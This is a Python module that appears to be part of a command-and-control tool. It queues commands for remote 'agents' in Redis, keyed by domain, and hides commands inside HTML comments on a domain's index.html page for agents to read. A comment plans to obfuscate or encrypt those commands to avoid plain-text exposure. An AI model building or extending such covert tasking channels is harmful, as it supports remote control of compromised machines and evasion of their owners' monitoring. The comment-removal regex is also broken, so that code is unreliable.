# File that handles the inputting and returning of commands into a given domain
# Composed fully of static methods that are called by the main.py command line
import os
import re

# TODO: Look at how this would be handled for different endpoints on a domain, so going to have to understand how that is generated
# TODO: Add a try-catch around all this code, just not sure where that the try cathc itself should go


# TODO: How can we make this not plain text, maybe have it encrypyted or at the least obfuscated and then decoded by the agent
# NOTE: The comment can be added anywhere except outside of the <html> brackets doing this causes everything to break:write

from time import time
import redis


def queue_agent_modification_commands(
    domain, redis_client, commands: list[str]
) -> bool:
    """Queues command(s) to modify the values of an agent (timer, alive status, domain, etc)"""

    list_key = f"{domain}:mod_pending"

    try:
        for command in commands:
            redis_client.lpush(list_key, command)
        return True
    except redis.RedisError as e:
        print(f"Redis error while queuing agent modification commands: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error while queuing agent modification commands: {e}")
        return False


def get_queued_agent_modification_commands(domain, redis_client) -> list[str]:
    """Returns all the commands that were queued for agent modification"""

    list_key = f"{domain}:mod_pending"
    commands = []

    try:
        # Pop all of the commands from the pending list
        for i in range(redis_client.llen(list_key)):
            # We pop from the back of the list, executing commands at the back first
            object = redis_client.rpop(list_key)
            if object:
                commands.append(object)
        return commands
    except redis.RedisError as e:
        print(f"Redis error while getting agent modification commands: {e}")
        return []
    except Exception as e:
        print(f"Unexpected error while getting agent modification commands: {e}")
        return []


def validate_agent_modification_commands():
    """Ensures that the agent modification commands follow a set structure"""


def queue_commands(domain, redis_client, commands: list[str]):
    """Queues a command(s) into the redis stream for this given command"""

    list_key = f"{domain}:pending"

    try:
        for command in commands:
            redis_client.lpush(list_key, command)
        return True
    except redis.RedisError as e:
        print(f"Redis error while queuing commands: {e}")
        return False
    except Exception as e:
        print(f"Unexpected error while queuing commands: {e}")
        return False


# TODO: In the future we only remove from the list if the command was sucessful (unsure though as there is no "peek")
def get_queued_commands(domain: str, redis_client) -> list[str]:
    """Gets all of hte queued commands"""

    list_key = f"{domain}:pending"
    commands = []

    try:
        # Pop all of the commands from the pending list
        for i in range(redis_client.llen(list_key)):
            # We pop from the back of the list, executing commands at the back first
            object = redis_client.rpop(list_key)
            if object:
                commands.append(object)
        return commands
    except redis.RedisError as e:
        print(f"Redis error while getting queued commands: {e}")
        return []
    except Exception as e:
        print(f"Unexpected error while getting queued commands: {e}")
        return []


def insert_HTML_comment(domain, command):
    """Insert a command into a given domains index.html page"""
    template_folder = f"templates/{domain}"
    index_file_path = os.path.join(template_folder, "index.html")

    content = _remove_HTML_comment(domain)
    comment = f"<!--{command}-->"

    if "</html>" in content:
        content = content.replace("</html>", f"    {comment}\n</html>")
    else:
        content += comment

    with open(index_file_path, "w") as file:
        file.write(content)

    return True


def _remove_HTML_comment(domain):
    """Removes any HTML comments that are present in a domain to allow for for new commands to be inserted"""

    template_folder = f"templates/{domain}"
    index_file_path = os.path.join(template_folder, "index.html")

    content = ""

    with open(index_file_path, "r") as file:
        content = file.read()

    # Search with a regex, (NOTE how this functions may have to be modified if we are doing a queue type of system)
    pattern = r"<!--*-->"
    content = re.sub(pattern, "", content)

    return content
